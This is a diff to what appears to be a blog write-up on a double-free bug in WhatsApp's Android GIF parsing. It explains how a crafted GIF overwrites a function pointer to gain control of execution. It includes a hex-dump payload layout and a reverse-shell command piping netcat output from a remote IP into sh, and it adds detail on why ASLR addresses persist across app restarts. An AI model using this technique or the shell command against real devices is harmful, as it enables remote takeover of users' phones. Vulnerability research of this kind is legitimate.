@@ -121,7 +121,7 @@ We then craft a GIF file with three frames of below sizes:
 - 0
 - 0
 
-When the WhatsApp Gallery is opened, the said GIF file triggers the double-free bug on rasterBits buffer with size `sizeof(GifInfo)`. Interestingly, in WhatsApp Gallery, a GIF file is parsed twice. When the said GIF file is parsed again, another GifInfo object is created. Bacause of the double-free behavior in Android, GifInfo `info` object and `info->rasterBits` will point to the same address. DDGifSlurp() will then decode the first frame to `info->rasterBits` buffer, thus overwriting `info` and its `rewindFunction()`, which is called right at the end of DDGifSlurp() function.
+When the WhatsApp Gallery is opened, the said GIF file triggers the double-free bug on rasterBits buffer with size `sizeof(GifInfo)`. Interestingly, in WhatsApp Gallery, a GIF file is parsed twice. When the said GIF file is parsed again, another GifInfo object is created. Because of the double-free behavior in Android, GifInfo `info` object and `info->rasterBits` will point to the same address. DDGifSlurp() will then decode the first frame to `info->rasterBits` buffer, thus overwriting `info` and its `rewindFunction()`, which is called right at the end of DDGifSlurp() function.
 
 ## Controlling PC register
 The GIF file that we need to craft is as below:
@@ -230,7 +230,7 @@ The above GIF triggers crash as below:
 ```
 
 ## Deal with ASLR and W^X
-After controlling the PC, we want to achieve remote code execution. In Android, we can not execute code on non-executable regions (i.e. stack and heap). The easiest way to to execute the below command:
+After controlling the PC, we want to achieve remote code execution. In Android, we can not execute code on non-executable regions due to W^X (i.e. stack and heap). The easiest way to deal with W^X in our case is to execute the below command:
 ```
 system("toybox nc 192.168.2.72 4444 | sh");
 ```
@@ -258,7 +258,7 @@ Let say the address of the above gadget is AAAAAAAA and the address of system() 
 00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
 00000080: 4141 4141 4141 4141 eeff                 AAAAAAAA..
 ```
-Now to find out AAAAAAAA and BBBBBBBB, we need an information disclosure vulnerability that gives us the base address of libc.so and libhwui.so. That vulnerability is not in the scope of this blogpost.
+In a normal Android system, because every processes are spawned from Zygotes, even with ASLR our addresses AAAAAAAA and BBBBBBBB do not change if WhatsApp is killed and restarted. However, they cannot persist a system reboot. To have reliable AAAAAAAA and BBBBBBBB, we need an information disclosure vulnerability that gives us the base address of libc.so and libhwui.so. That vulnerability is beyond scope of this blogpost.
 
 ## Putting everything together
 
